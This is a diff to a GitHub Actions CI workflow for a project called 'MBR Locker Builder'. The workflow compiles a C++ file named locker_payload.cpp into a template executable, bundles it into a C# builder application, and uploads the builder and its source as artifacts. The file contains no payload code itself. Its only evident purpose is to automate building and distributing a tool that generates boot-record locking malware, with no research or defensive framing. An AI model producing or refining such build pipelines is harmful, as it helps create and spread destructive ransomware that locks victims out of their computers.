@@ -1,4 +1,4 @@
-name: Build
+name: Build MBR Locker Builder
 
 on:
   push:
@@ -10,31 +10,57 @@ jobs:
     runs-on: windows-latest
 
     steps:
-    - uses: actions/checkout@v3
+    - name: Checkout code
+      uses: actions/checkout@v4
 
     - name: Install NASM
       run: choco install nasm -y
 
     - name: Install Visual Studio Build Tools
-      run: choco install visualstudio2019buildtools -y
-
-    - name: Compile Template
       run: |
-        cd template
-        call "C:\Program Files (x86)\Microsoft Visual Studio\2019\BuildTools\VC\Auxiliary\Build\vcvars64.bat"
-        cl /EHsc /O2 /MT locker_payload.cpp user32.lib kernel32.lib advapi32.lib
-        move locker_payload.exe ..\builder\Resources\template.exe
+        choco install visualstudio2022buildtools -y
+        choco install visualstudio2022-workload-vctools -y
 
     - name: Setup .NET
-      uses: actions/setup-dotnet@v3
+      uses: actions/setup-dotnet@v4
       with:
         dotnet-version: 6.0.x
 
-    - name: Build Builder
-      run: dotnet build builder/Builder.csproj -c Release -o output
+    - name: Compile Template (locker_payload.exe)
+      run: |
+        cd template
+        call "C:\Program Files\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat"
+        cl /EHsc /O2 /MT locker_payload.cpp user32.lib kernel32.lib advapi32.lib
+        if exist locker_payload.exe (
+          move locker_payload.exe ..\builder\Resources\template.exe
+          echo Template compiled successfully
+        ) else (
+          echo Compilation failed!
+          exit /b 1
+        )
 
-    - name: Upload
-      uses: actions/upload-artifact@v3
+    - name: Build Builder (C# WinForms)
+      run: |
+        cd builder
+        dotnet restore
+        dotnet build -c Release -o ../output
+
+    - name: Upload Builder (autonomous)
+      uses: actions/upload-artifact@v4
       with:
         name: MbrLockerBuilder
-        path: output/
+        path: |
+          output/
+          !output/*.pdb
+        if-no-files-found: error
+
+    - name: Upload Source Code
+      uses: actions/upload-artifact@v4
+      with:
+        name: SourceCode
+        path: |
+          builder/
+          locker/
+          template/
+          README.md
+        if-no-files-found: warn
